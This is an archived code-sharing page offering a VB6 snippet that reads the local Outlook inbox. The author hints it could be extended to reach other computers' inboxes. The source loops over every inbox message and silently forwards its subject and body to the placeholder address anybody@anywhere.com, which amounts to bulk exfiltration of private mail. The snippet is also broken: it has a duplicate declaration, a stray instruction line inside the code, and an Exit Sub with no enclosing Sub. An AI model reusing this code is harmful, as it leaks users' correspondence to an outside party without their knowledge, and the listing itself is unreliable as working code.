<div align="center">

## Get INBOX From OUTLOOK


</div>

### Description

NOw you can get the inbox from outlook (if enhanced you can get mails from other computers inboxes.) with this simple code. Please feedback if you cannot do anything with this code, so that I post the zip file with a sample prject. It also can send messages to people in OUtlook.
 
### More Info
 


<span>             |<span>
---                |---
**Submitted On**   |
**By**             |[VbNick](https://github.com/Planet-Source-Code/PSCIndex/blob/master/ByAuthor/vbnick.md)
**Level**          |Intermediate
**User Rating**    |4.7 (14 globes from 3 users)
**Compatibility**  |VB 5\.0, VB 6\.0
**Category**       |[Internet/ HTML](https://github.com/Planet-Source-Code/PSCIndex/blob/master/ByCategory/internet-html__1-34.md)
**World**          |[Visual Basic](https://github.com/Planet-Source-Code/PSCIndex/blob/master/ByWorld/visual-basic.md)
**Archive File**   |[](https://github.com/Planet-Source-Code/vbnick-get-inbox-from-outlook__1-11793/archive/master.zip)

### API Declarations

kayahan@programmer.net


### Source Code

```
'by Kayhan Tanriseven
'THis code shows you how to get inbox from Outlook
[1]  Add the reference To the Outlook Object Library
Dim myOLApp As New Outlook.Application
Dim olNameSpace As Outlook.NameSpace
Dim myItem As New Outlook.AppointmentItem
Dim myRequest As New Outlook.MailItem
Dim myFolder As Outlook.MAPIFolder
Public myResponse
Dim L As String
Dim i As Integer
Dim SearchSub As String
Dim strSubject As String
Dim myFolder As Outlook.MAPIFolder
Dim strSender As String
Dim strBody As String
Dim olMapi As Object
Dim strOwnerBox As String
Dim sbOLApp
Set myOLApp = CreateObject("Outlook.Application")
Set olNameSpace = myOLApp.GetNamespace("MAPI")
Set myFolder = olNameSpace.GetDefaultFolder(olFolderInbox)
'Dim mailfolder As Outlook.MAPIFolder
Set olMapi = GetObject("", "Outlook.Application").GetNamespace("MAPI")
For i = 1 To myFolder.Items.Count
  strSubject = myFolder.Items(i).Subject
  strBody = myFolder.Items(i).Body
  strSender = myFolder.Items(i).SenderName
  strOwnerBox = myFolder.Items(i).ReceivedByName
' Now Mail it to somebody
  Set sbOLAPp = CreateObject("Outlook.Application")
  Set myRequest = myOLApp.CreateItem(olMailItem)
  With myRequest
    .Subject = strSubject
    .Body = strBody
    .To = "anybody@anywhere.com"
    .Send
  End With
  Set sbOLAPp = Nothing
Next
Set myOLApp = Nothing
Exit Sub
```

